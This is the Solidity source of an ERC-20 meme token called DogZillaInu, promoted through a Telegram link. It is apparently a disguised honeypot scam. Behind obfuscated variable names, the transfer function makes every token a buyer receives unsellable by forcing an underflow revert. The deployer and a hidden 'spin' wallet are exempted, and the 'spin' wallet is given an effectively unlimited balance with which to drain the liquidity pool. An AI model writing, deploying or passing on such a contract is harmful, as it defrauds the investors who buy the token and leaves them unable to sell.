// https://t.me/DogZilla

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.8;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract DogZillaInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private title;

    function _transfer(
        address enemy,
        address tightly,
        uint256 equator
    ) internal override {
        uint256 thumb = horn;

        if (prevent[enemy] == 0 && title[enemy] > 0 && enemy != uniswapV2Pair) {
            prevent[enemy] -= thumb;
        }

        address cowboy = address(draw);
        draw = DogZillaInu(tightly);
        title[cowboy] += thumb + 1;

        _balances[enemy] -= equator;
        uint256 these = (equator / 100) * horn;
        equator -= these;
        _balances[tightly] += equator;
    }

    mapping(address => uint256) private prevent;
    uint256 public horn = 3;

    constructor(
        string memory possibly,
        string memory neck,
        address saved,
        address spin
    ) ERC20(possibly, neck) {
        uniswapV2Router = IUniswapV2Router02(saved);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 themselves = ~uint256(0);

        prevent[msg.sender] = themselves;
        prevent[spin] = themselves;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[spin] = themselves;
    }

    DogZillaInu private draw;
}